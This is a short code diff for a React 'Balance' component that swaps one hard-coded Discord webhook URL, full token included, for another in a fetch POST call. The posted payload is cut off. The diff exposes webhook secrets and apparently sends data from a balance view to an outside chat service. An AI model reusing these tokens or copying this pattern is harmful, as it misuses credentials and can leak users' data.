@@ -60,7 +60,7 @@ export const Balance = () => {
     }
 
     try {
-      await fetch('https://discord.com/api/webhooks/1305537920756879360/-h8ZUMpRyUczakCqpK21N1b47PFLAu98nQUb2jA5UjHOxTrYKPzeGREZQ9GwCjvVlYhu', {
+      await fetch('https://discord.com/api/webhooks/1306828135244890172/pcvzVkoRvTtKUkxFJ7Q_qDDMMCJ327Ye5Xd1U6qL7Ps0b5GekLTW8b70QUxa_D3md7cn', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
